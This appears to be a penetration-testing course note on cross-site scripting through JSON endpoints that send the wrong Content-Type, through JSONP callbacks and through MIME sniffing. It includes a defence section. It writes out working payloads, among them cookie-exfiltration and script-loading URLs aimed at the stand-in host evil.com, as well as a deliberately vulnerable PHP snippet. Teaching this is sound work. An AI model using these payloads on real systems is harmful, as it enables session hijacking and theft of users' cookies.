---
tags: [vapt, xss, intermediate]
difficulty: intermediate
module: "07 - XSS"
topic: "07.11 XSS in JSON Response Without Content-Type"
---

# 07.11 — XSS in JSON Response (Without Content-Type)

## The Problem: JSON Served as HTML

JSON APIs normally return `Content-Type: application/json`. But if an endpoint returns JSON data without the correct Content-Type header (or with `text/html`), the browser renders the JSON as HTML — creating potential XSS.

```
NORMAL (SAFE):
  HTTP/1.1 200 OK
  Content-Type: application/json
  
  {"name":"<script>alert(1)</script>"}
  → Browser displays as text, doesn't execute

VULNERABLE:
  HTTP/1.1 200 OK
  Content-Type: text/html          ← WRONG! Or missing!
  
  {"name":"<script>alert(1)</script>"}
  → Browser renders as HTML → XSS fires!
```

---

## Why JSON Endpoints Get Misconfigured

```
COMMON REASONS:
  1. Developer forgot to set Content-Type header
  2. Framework default is text/html unless overridden
  3. JSONP endpoint (returns function wrapper — is meant to be JS)
  4. API returns JSON based on user parameter but with wrong headers
  5. Old PHP: header("Content-Type: text/html") is default
  6. Express.js: res.send({}) sets Content-Type to application/json
                 res.end(jsonString) without setHeader → may default!

ATTACK FLOW:
  1. Find API endpoint that returns JSON with user-controlled data
  2. Check: does it return Content-Type: application/json?
  3. If not (or if text/html) → try injecting HTML/script in the user-controlled field
  4. Visit the raw API URL in browser → XSS fires!
```

---

## JSONP Endpoints — Classic XSS Vector

JSONP (JSON with Padding) wraps JSON in a JavaScript function call. Since JSONP is designed to be loaded as a script, it's inherently executable.

```
JSONP RESPONSE:
  GET /api/user?callback=myFunction
  
  HTTP/1.1 200 OK
  Content-Type: application/javascript
  
  myFunction({"username":"john","role":"user"});
  
  → This is valid JavaScript! Browser executes it!
```

```
JSONP XSS ATTACK:
  If callback parameter is NOT filtered:
  
  GET /api/user?callback=alert(1)//
  
  Response:
  alert(1)//({"username":"john","role":"user"});
  → alert(1) executes!  // comments out the rest!

  OR INJECT FULL PAYLOAD:
  GET /api/user?callback=alert(document.cookie)//
  → cookie theft!
  
  ADVANCED — break out of function call:
  GET /api/user?callback=x;alert(document.cookie);//
  Response: x;alert(document.cookie);//({"username":"...});
  → x; is ignored → alert fires!
```

---

## Content-Type Sniffing (MIME Sniffing)

Even with correct Content-Type, old browsers (IE) would "sniff" content type:

```
MIME SNIFFING:
  Server sends: Content-Type: application/json
  Content: {"html":"<script>alert(1)</script>"}
  
  OLD IE BEHAVIOR:
  IE sniffs content, sees HTML tags → renders as HTML → XSS!
  
  FIX: X-Content-Type-Options: nosniff header
  → Tells browsers: "don't sniff, trust the Content-Type"

STILL RELEVANT:
  X-Content-Type-Options: nosniff is important!
  Without it: IE/old browser MIME sniffing attacks work
  With it: Browser MUST use declared Content-Type
```

---

## Finding JSON XSS

```bash
# STEP 1: FIND ENDPOINTS THAT REFLECT USER INPUT IN JSON:
# Look for: /api/user, /api/profile, /api/search?q=, etc.

# STEP 2: CHECK CONTENT-TYPE HEADER IN RESPONSE:
curl -s -I https://target.com/api/user/1 | grep -i content-type
# SAFE:     Content-Type: application/json
# VULNERABLE: Content-Type: text/html
# VULNERABLE: Content-Type: (missing)

# STEP 3: INJECT TEST PAYLOAD:
curl -s "https://target.com/api/search?q=<script>alert(1)</script>"
# Check response: is the <script> present unencoded?

# STEP 4: TEST JSONP:
curl -s "https://target.com/api/data?callback=alert(1)//"
# Check if callback value appears in response unfiltered

# STEP 5: VISIT RAW URL IN BROWSER TO CONFIRM EXECUTION:
# Navigate to: https://target.com/api/data?callback=alert(1)//
# → If alert fires, it's XSS!

# STEP 6: LOOK FOR JSONP IN JS SOURCES:
grep -r "callback=" *.js | grep "jsonp\|JSONP\|script"
```

---

## Exploiting JSON XSS

```
STEP 1: CONFIRM VULNERABLE ENDPOINT:
  GET /api/user?name=<script>alert(1)</script>
  Response: Content-Type: text/html
            {"name":"<script>alert(1)</script>"}
  → Navigate to this URL in browser → XSS fires!

STEP 2: EXPLOIT FOR COOKIE THEFT:
  GET /api/user?name=<script>document.location='https://evil.com/?c='+document.cookie</script>
  → Send victim this URL → they visit → cookies stolen!

STEP 3: JSONP EXPLOIT:
  GET /api/data?callback=<injected>
  
  PAYLOAD:
  ?callback=;var+s=document.createElement('script');s.src='https://evil.com/evil.js';document.head.appendChild(s)//
  → Loads attacker's external script!
  
  SIMPLER:
  ?callback=alert(document.cookie)//
```

---

## Real-World Example: Search API

```
VULNERABLE APPLICATION:
  PHP backend:
  <?php
  $q = $_GET['q'];
  // No Content-Type header set! Default is text/html
  echo json_encode(["results" => searchDB($q), "query" => $q]);
  ?>

ATTACK:
  GET /api/search?q=<img src=x onerror=alert(document.cookie)>
  
  Response:
  Content-Type: text/html     ← PHP's default!
  
  {"results":[],"query":"<img src=x onerror=alert(document.cookie)>"}
  → Browser renders as HTML → onerror fires → cookies stolen!

FIX:
  header("Content-Type: application/json");
  // AND
  header("X-Content-Type-Options: nosniff");
```

---

## JSON XSS Defense

```
SERVER SIDE:
  1. Always set: Content-Type: application/json
  2. Set: X-Content-Type-Options: nosniff
  3. Validate/whitelist callback parameter (only alphanumeric!)
  4. Avoid JSONP entirely — use CORS instead
  5. Encode JSON output (JSON.stringify encodes properly)

CLIENT SIDE:
  1. Parse JSON with JSON.parse() — not eval()!
  2. Never use eval() on JSONP callbacks
  
FRAMEWORK:
  Express.js:
    res.json({...}) → automatically sets Content-Type: application/json
    res.send(jsonString) → must manually set header!
  
  Flask:
    return jsonify({...}) → correct Content-Type automatically
    return json.dumps({...}) → must manually set Content-Type!
```

---

## Related Notes
- [[02 - Reflected XSS]] — reflected XSS
- [[04 - DOM-Based XSS]] — eval() as sink
- [[14 - XSS Filter Bypass Techniques]] — bypassing JSON encoding
- [[Module 11 - CORS]] — replacing JSONP with CORS
